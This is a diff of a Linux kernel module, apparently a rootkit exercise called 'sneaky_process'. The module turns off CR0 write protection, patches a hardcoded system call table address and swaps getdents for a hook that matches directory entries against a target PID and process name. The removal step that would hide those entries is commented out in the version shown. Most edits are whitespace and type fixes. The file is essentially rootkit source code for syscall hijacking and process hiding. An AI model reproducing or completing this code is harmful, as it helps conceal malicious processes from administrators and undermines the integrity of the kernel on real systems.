@@ -1,6 +1,6 @@
-#include <linux/module.h>      // for all modules 
-#include <linux/init.h>        // for entry/exit macros 
-#include <linux/kernel.h>      // for printk and other kernel bits 
+#include <linux/module.h>      // for all modules
+#include <linux/init.h>        // for entry/exit macros
+#include <linux/kernel.h>      // for printk and other kernel bits
 #include <asm/current.h>       // process information
 #include <linux/sched.h>
 #include <linux/highmem.h>     // for changing page permissions
@@ -17,7 +17,7 @@ struct linux_dirent {
   char           d_name[];
   };
 static char* processname = "sneaky_process";
-//static char proc_dir[50] = "/proc/" ;
+static char proc_dir[50] = "/proc/" ;
 
 //Macros for kernel functions to alter Control Register 0 (CR0)
 //This CPU has the 0-bit of CR0 set to 1: protected mode is enabled.
@@ -41,17 +41,17 @@ void (*pages_ro)(struct page *page, int numpages) = (void *)0xffffffff81070730;
 //This is a pointer to the system call table in memory
 //Defined in /usr/src/linux-source-3.13.0/arch/x86/include/asm/syscall.h
 //We're getting its adddress from the System.map file (see above).
-static unsigned int *sys_call_table = (unsigned long*)0xffffffff81a00200;
+static unsigned long *sys_call_table = (unsigned long*)0xffffffff81a00200;
 
 //Function pointer will be used to save address of original 'open' syscall.
 //The asmlinkage keyword is a GCC #define that indicates this function
 //should expect ti find its arguments on the stack (not in registers).
 //This is used for all system calls.
-asmlinkage int (*original_call)(unsigned int fd, 
+asmlinkage long (*original_call)(unsigned int fd,
 struct linux_dirent __user *dirp, unsigned int count);
 
 //Define our new sneaky version of the 'getdents' syscall
-asmlinkage int sneaky_sys_getdents(unsigned int fd, 
+asmlinkage long sneaky_sys_getdents(unsigned int fd,
 struct linux_dirent __user *dirp, unsigned int count){
   //printk(KERN_INFO "pid = %d\n", mypid);
   long value;
@@ -63,12 +63,12 @@ struct linux_dirent __user *dirp, unsigned int count){
     len = dirp->d_reclen;
     tlen -= len;
     //printk("%s\n", dirp->d_name);
-    if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) { 
+    if( strcmp(dirp->d_name, mypid) == 0 || strcmp(dirp->d_name, processname) == 0 ) {
       printk("%s\n", dirp->d_name);
+
       /*memmove(dirp, (char*) dirp + dirp->d_reclen, tlen);
       value -= len;
-      printk(KERN_INFO "hide successful\n");
-      continue;*/
+      printk(KERN_INFO "hide successful\n");*/
     }
     if(tlen) {
       dirp = (struct linux_dirent* ) ((char*) dirp + dirp->d_reclen);
@@ -107,15 +107,15 @@ static int initialize_sneaky_module(void)
 
   //strcat(proc_dir, mypid);
 
-  return 0;       // to show a successful load 
-}  
+  return 0;       // to show a successful load
+}
 
 
-static void exit_sneaky_module(void) 
+static void exit_sneaky_module(void)
 {
   struct page *page_ptr;
 
-  printk(KERN_INFO "Sneaky module being unloaded.\n"); 
+  printk(KERN_INFO "Sneaky module being unloaded.\n");
 
   //Turn off write protection mode
   write_cr0(read_cr0() & (~0x10000));
@@ -134,9 +134,8 @@ static void exit_sneaky_module(void)
   pages_ro(page_ptr, 1);
   //Turn write protection mode back on
   write_cr0(read_cr0() | 0x10000);
-}  
+}
 
 
-module_init(initialize_sneaky_module);  // what's called upon loading 
-module_exit(exit_sneaky_module);        // what's called upon unloading  
-
+module_init(initialize_sneaky_module);  // what's called upon loading
+module_exit(exit_sneaky_module);        // what's called upon unloading
